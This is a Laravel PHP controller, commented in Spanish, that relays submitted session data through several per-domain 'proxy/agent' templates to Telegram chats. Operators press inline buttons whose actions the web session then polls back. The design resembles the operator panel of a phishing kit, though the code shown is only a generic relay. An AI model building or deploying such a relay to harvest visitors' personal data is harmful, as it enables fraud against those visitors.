<?php

namespace App\Http\Controllers;

use App\Services\ProxyConfigService;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Log;

class TelegramController extends Controller
{
    private $botToken;
    private $proxyConfigService;

    public function __construct(ProxyConfigService $proxyConfigService)
    {
        $this->botToken = config('services.telegram.bot_token');
        $this->proxyConfigService = $proxyConfigService;
    }

    /**
     * Obtener todos los chat_ids según el proxy actual
     */
    private function getChatIds(): array
    {
        // Si está detrás de un proxy, usar los chat_ids del proxy
        if (config('app.behind_proxy', false)) {
            $chatIds = $this->proxyConfigService->getCurrentChatIds();

            if (empty($chatIds)) {
                Log::warning('No se pudieron obtener chat_ids del proxy actual');
            }

            return array_filter($chatIds); // Remover nulls
        }

        // Si no está detrás de proxy (desarrollo), usar configuración tradicional
        $chatIdString = config('services.telegram.chat_id');
        return array_filter(array_map('trim', explode(',', $chatIdString)));
    }

    /**
     * Obtener el nombre del proxy/agente actual
     */
    private function getName(): string
    {
        if (config('app.behind_proxy', false)) {
            return $this->proxyConfigService->getCurrentName() ?? 'Unknown';
        }

        return config('app.name', 'Laravel');
    }

    /**
     * Construir mensaje desde plantilla
     */
    private function buildMessageFromTemplate(array $template, array $data, string $uniqid, string $domain, string $name): string
    {
        $message = '';

        // Construir header si está habilitado
        if (isset($template['header']) && ($template['header']['enabled'] ?? false)) {
            foreach ($template['header']['fields'] as $field) {
                $value = $field['value'] ?? '';
                // Reemplazar variables especiales
                $value = str_replace('{domain}', $domain, $value);
                $value = str_replace('{name}', $name, $value);
                $value = str_replace('{uniqid}', $uniqid, $value);

                $emoji = $field['emoji'] ?? '';
                $label = $field['label'] ?? '';
                $message .= "{$emoji} *{$label}:* `{$value}`\n";
            }
            $message .= "\n";
        }

        // Construir secciones
        if (isset($template['sections'])) {
            foreach ($template['sections'] as $section) {
                if (!($section['enabled'] ?? true)) {
                    continue;
                }

                // Agregar título de sección si existe
                if (!empty($section['title'])) {
                    $message .= $section['title'] . "\n";
                }

                // Agregar campos de la sección
                foreach ($section['fields'] as $field) {
                    $emoji = $field['emoji'] ?? '';
                    $label = $field['label'] ?? '';
                    $key = $field['key'] ?? '';
                    $value = $data[$key] ?? ' ';

                    $message .= "{$emoji} *{$label}:* `{$value}`\n";
                }

                $message .= "\n";
            }
        }

        return $message;
    }

    /**
     * Construir teclado de botones desde plantilla
     * @param array $template - Plantilla de mensaje
     * @param string $uniqid - ID único de sesión
     * @param bool $includeButtons - Si se deben incluir los botones o no
     */
    private function buildKeyboardFromTemplate(array $template, string $uniqid, bool $includeButtons = true): ?array
    {
        // Si no se deben incluir botones, retornar null
        if (!$includeButtons) {
            return null;
        }

        if (!isset($template['buttons']) || !($template['buttons']['enabled'] ?? false)) {
            return null;
        }

        $inlineKeyboard = [];

        if (isset($template['buttons']['rows'])) {
            foreach ($template['buttons']['rows'] as $row) {
                $keyboardRow = [];
                foreach ($row as $button) {
                    $keyboardRow[] = [
                        'text' => $button['text'] ?? '',
                        'callback_data' => $uniqid . '_' . ($button['action'] ?? '')
                    ];
                }
                $inlineKeyboard[] = $keyboardRow;
            }
        }

        return [
            'inline_keyboard' => $inlineKeyboard
        ];
    }

    /**
     * Enviar datos a Telegram con botones inline
     */
    public function send(Request $request)
    {
        $uniqid = $request->input('uniqid');
        $data = $request->input('data');
        $templateName = $request->input('template'); // Plantilla específica solicitada

        // PROTECCIÓN: Evitar envíos duplicados en un corto período de tiempo
        // Usar hash del contenido para detectar mensajes idénticos
        $messageHash = md5($uniqid . json_encode($data));
        $sendCacheKey = "telegram_send_{$messageHash}";

        if (Cache::has($sendCacheKey)) {
            Log::info("Envío duplicado detectado y bloqueado para sesión {$uniqid}");
            return response()->json([
                'success' => true,
                'message' => 'Mensaje ya enviado recientemente',
                'status' => 'duplicate_prevented'
            ]);
        }

        // Marcar este envío como procesado (expira en 3 segundos - tiempo suficiente para evitar doble clic)
        Cache::put($sendCacheKey, true, now()->addSeconds(3));

        // Obtener chat_ids y nombre
        $chatIds = $this->getChatIds();
        $name = $this->getName();

        if (empty($chatIds)) {
            Log::error('No se pudieron obtener chat_ids para enviar el mensaje');
            return response()->json([
                'success' => false,
                'error' => 'Chat IDs not configured'
            ], 500);
        }

        // Obtener dominio del proxy para mostrar en el mensaje
        $proxyDomain = request()->getHost();

        // Obtener plantilla: primero intenta usar la plantilla específica, si no, usa la del dominio
        $template = null;
        if ($templateName) {
            $template = $this->proxyConfigService->getTemplateByName($templateName);
            Log::info("Usando plantilla específica: {$templateName}", ['encontrada' => $template ? 'sí' : 'no']);
        }
        if (!$template) {
            $template = $this->proxyConfigService->getCurrentTelegramTemplate();
        }

        if (!$template) {
            Log::warning('No se pudo obtener plantilla de Telegram, usando formato por defecto');
            // Fallback al formato original si no hay plantilla
            $message = "No hay plantilla asignada";
        } else {
            // Usar plantilla para construir el mensaje
            $message = $this->buildMessageFromTemplate($template, $data, $uniqid, $proxyDomain, $name);
            $keyboard = $this->buildKeyboardFromTemplate($template, $uniqid);
        }

        try {
            $successCount = 0;
            $errorCount = 0;
            $errors = [];
            $sentTo = [];

            // Enviar el mensaje a cada chat_id configurado
            foreach ($chatIds as $index => $chatId) {
                if (!$chatId) {
                    continue;
                }

                $response = Http::post("https://api.telegram.org/bot{$this->botToken}/sendMessage", [
                    'chat_id' => $chatId,
                    'text' => $message,
                    'parse_mode' => 'Markdown',
                    'reply_markup' => json_encode($keyboard)
                ]);

                if ($response->successful()) {
                    $successCount++;
                    $sentTo[] = [
                        'chat_id' => $chatId,
                        'name' => $name
                    ];

                    Log::info("Mensaje enviado a Telegram", [
                        'chat_id' => $chatId,
                        'name' => $name,
                        'domain' => $proxyDomain,
                        'session' => $uniqid
                    ]);
                } else {
                    $errorCount++;
                    $errorMessage = $response->body();
                    $errors[] = [
                        'chat_id' => $chatId,
                        'error' => $errorMessage
                    ];

                    Log::error("Error enviando mensaje a Telegram", [
                        'chat_id' => $chatId,
                        'error' => $errorMessage,
                        'domain' => $proxyDomain
                    ]);
                }
            }

            // Retornar respuesta según los resultados
            if ($successCount > 0) {
                return response()->json([
                    'success' => true,
                    'message' => "Mensaje enviado a {$successCount} chat(s)",
                    'domain' => $proxyDomain,
                    'details' => [
                        'success_count' => $successCount,
                        'error_count' => $errorCount,
                        'sent_to' => $sentTo,
                        'errors' => $errors
                    ]
                ]);
            } else {
                return response()->json([
                    'success' => false,
                    'error' => 'No se pudo enviar el mensaje a ningún chat',
                    'domain' => $proxyDomain,
                    'details' => [
                        'errors' => $errors
                    ]
                ], 500);
            }
        } catch (\Exception $e) {
            Log::error("Excepción al enviar mensaje a Telegram: " . $e->getMessage());
            return response()->json([
                'success' => false,
                'error' => $e->getMessage()
            ], 500);
        }
    }

    /**
     * Verificar qué botón fue presionado desde Telegram
     */
    public function checkButton(Request $request)
    {
        $uniqid = $request->input('uniqid');

        // Verificar en cache qué botón fue presionado
        $button = Cache::get("telegram_button_{$uniqid}");

        if ($button) {
            // Limpiar el cache después de leer
            Cache::forget("telegram_button_{$uniqid}");

            return response()->json([
                'button' => $button,
                'uniqid' => $uniqid
            ]);
        }

        return response()->json([
            'button' => null,
            'uniqid' => $uniqid
        ]);
    }

    /**
     * Webhook para recibir callbacks de Telegram
     */
    public function webhook(Request $request)
    {
        $update = $request->all();

        Log::info('Telegram webhook received', $update);

        // Verificar si es un callback_query (botón presionado)
        if (isset($update['callback_query'])) {
            $callbackData = $update['callback_query']['data'];
            $callbackQueryId = $update['callback_query']['id'];

            // PROTECCIÓN 1: Verificar si ya procesamos este callback_query_id
            $callbackCacheKey = "telegram_callback_processed_{$callbackQueryId}";
            if (Cache::has($callbackCacheKey)) {
                Log::info("Callback duplicado detectado y bloqueado: {$callbackQueryId}");
                return response()->json(['ok' => true, 'status' => 'duplicate']);
            }

            // Marcar este callback como procesado (expira en 10 minutos)
            Cache::put($callbackCacheKey, true, now()->addMinutes(10));

            // Extraer uniqid y acción del callback_data
            // Formato: UNIQID_accion (ej: sess_123_abc_login)
            // La acción es siempre el último elemento después del último guion bajo
            $lastUnderscorePos = strrpos($callbackData, '_');

            if ($lastUnderscorePos !== false) {
                $uniqid = substr($callbackData, 0, $lastUnderscorePos);
                $action = substr($callbackData, $lastUnderscorePos + 1);

                // PROTECCIÓN 2: Verificar si ya existe un botón pendiente para esta sesión
                $existingButton = Cache::get("telegram_button_{$uniqid}");
                if ($existingButton) {
                    Log::warning("Ya existe un botón pendiente ({$existingButton}) para sesión {$uniqid}, se sobrescribirá con {$action}");
                }

                // Guardar en cache la acción presionada (expira en 5 minutos)
                Cache::put("telegram_button_{$uniqid}", $action, now()->addMinutes(5));

                // Responder al callback para quitar el "loading" del botón
                Http::post("https://api.telegram.org/bot{$this->botToken}/answerCallbackQuery", [
                    'callback_query_id' => $callbackQueryId,
                    'text' => 'Acción procesada ✓'
                ]);

                Log::info("Botón presionado: {$action} para sesión: {$uniqid}");

                // PROTECCIÓN 3: Prevenir mensajes de registro duplicados
                $registryCacheKey = "telegram_registry_sent_{$uniqid}_{$action}";
                if (!Cache::has($registryCacheKey)) {
                    // Enviar mensaje de registro indicando el botón presionado
                    $chatId = $update['callback_query']['message']['chat']['id'];
                    $buttonLabel = strtoupper($action); // Convertir a mayúsculas para consistencia

                    $registryMessage = "✅ *{$buttonLabel}* solicitado a ID de sesión: `{$uniqid}`";

                    Http::post("https://api.telegram.org/bot{$this->botToken}/sendMessage", [
                        'chat_id' => $chatId,
                        'text' => $registryMessage,
                        'parse_mode' => 'Markdown'
                    ]);

                    // Marcar este mensaje de registro como enviado (expira en 2 minutos)
                    Cache::put($registryCacheKey, true, now()->addMinutes(2));
                } else {
                    Log::info("Mensaje de registro duplicado evitado para {$action} en sesión {$uniqid}");
                }
            }
        }

        return response()->json(['ok' => true]);
    }

    /**
     * Enviar información a Telegram sin botones (solo notificación)
     * Usado para notificaciones informativas que no requieren interacción
     */
    public function sendInfo(Request $request)
    {
        $uniqid = $request->input('uniqid');
        $data = $request->input('data');
        $templateName = $request->input('template'); // Plantilla específica solicitada

        // Convertir includeButtons a booleano estricto
        $includeButtonsRaw = $request->input('includeButtons', false);
        $includeButtons = filter_var($includeButtonsRaw, FILTER_VALIDATE_BOOLEAN, FILTER_NULL_ON_FAILURE) ?? false;

        // Log para debugging
        Log::info('sendInfo llamado', [
            'uniqid' => $uniqid,
            'template_solicitada' => $templateName ?? 'ninguna',
            'includeButtons_raw' => $includeButtonsRaw,
            'includeButtons_parsed' => $includeButtons,
            'includeButtons_type' => gettype($includeButtons)
        ]);

        // PROTECCIÓN: Evitar envíos duplicados
        $messageHash = md5($uniqid . json_encode($data) . ($includeButtons ? '1' : '0'));
        $sendCacheKey = "telegram_sendinfo_{$messageHash}";

        if (Cache::has($sendCacheKey)) {
            Log::info("Envío de información duplicado detectado y bloqueado para sesión {$uniqid}");
            return response()->json([
                'success' => true,
                'message' => 'Información ya enviada recientemente',
                'status' => 'duplicate_prevented'
            ]);
        }

        // Marcar este envío como procesado (expira en 5 segundos)
        Cache::put($sendCacheKey, true, now()->addSeconds(5));

        // Obtener chat_ids y nombre
        $chatIds = $this->getChatIds();
        $name = $this->getName();

        if (empty($chatIds)) {
            Log::error('No se pudieron obtener chat_ids para enviar la información');
            return response()->json([
                'success' => false,
                'error' => 'Chat IDs not configured'
            ], 500);
        }

        // Obtener dominio del proxy
        $proxyDomain = request()->getHost();

        // Obtener plantilla: primero intenta usar la plantilla específica, si no, usa la del dominio
        $template = null;
        if ($templateName) {
            $template = $this->proxyConfigService->getTemplateByName($templateName);
            Log::info("sendInfo: Usando plantilla específica: {$templateName}", ['encontrada' => $template ? 'sí' : 'no']);
        }
        if (!$template) {
            $template = $this->proxyConfigService->getCurrentTelegramTemplate();
        }

        if (!$template) {
            Log::warning('No se pudo obtener plantilla de Telegram, usando formato por defecto');

            // Formato por defecto para datos personales
            $message = "No hay plantilla asignada";
            $keyboard = null;
        } else {
            // Usar plantilla para construir el mensaje
            $message = $this->buildMessageFromTemplate($template, $data, $uniqid, $proxyDomain, $name);
            // Construir teclado solo si includeButtons es true
            $keyboard = $this->buildKeyboardFromTemplate($template, $uniqid, $includeButtons);
        }

        try {
            $successCount = 0;
            $errorCount = 0;
            $errors = [];
            $sentTo = [];

            // Enviar el mensaje a cada chat_id configurado
            foreach ($chatIds as $chatId) {
                if (!$chatId) {
                    continue;
                }

                $payload = [
                    'chat_id' => $chatId,
                    'text' => $message,
                    'parse_mode' => 'Markdown'
                ];

                // Solo agregar reply_markup si hay teclado
                if ($keyboard !== null) {
                    $payload['reply_markup'] = json_encode($keyboard);
                }

                $response = Http::post("https://api.telegram.org/bot{$this->botToken}/sendMessage", $payload);

                if ($response->successful()) {
                    $successCount++;
                    $sentTo[] = [
                        'chat_id' => $chatId,
                        'name' => $name
                    ];

                    Log::info("Información enviada a Telegram", [
                        'chat_id' => $chatId,
                        'name' => $name,
                        'domain' => $proxyDomain,
                        'session' => $uniqid,
                        'includeButtons' => $includeButtons
                    ]);
                } else {
                    $errorCount++;
                    $errorMessage = $response->body();
                    $errors[] = [
                        'chat_id' => $chatId,
                        'error' => $errorMessage
                    ];

                    Log::error("Error enviando información a Telegram", [
                        'chat_id' => $chatId,
                        'error' => $errorMessage,
                        'domain' => $proxyDomain
                    ]);
                }
            }

            // Retornar respuesta según los resultados
            if ($successCount > 0) {
                return response()->json([
                    'success' => true,
                    'message' => "Información enviada a {$successCount} chat(s)",
                    'domain' => $proxyDomain,
                    'details' => [
                        'success_count' => $successCount,
                        'error_count' => $errorCount,
                        'sent_to' => $sentTo,
                        'errors' => $errors
                    ]
                ]);
            } else {
                return response()->json([
                    'success' => false,
                    'error' => 'No se pudo enviar la información a ningún chat',
                    'domain' => $proxyDomain,
                    'details' => [
                        'errors' => $errors
                    ]
                ], 500);
            }
        } catch (\Exception $e) {
            Log::error("Excepción al enviar información a Telegram: " . $e->getMessage());
            return response()->json([
                'success' => false,
                'error' => $e->getMessage()
            ], 500);
        }
    }
}
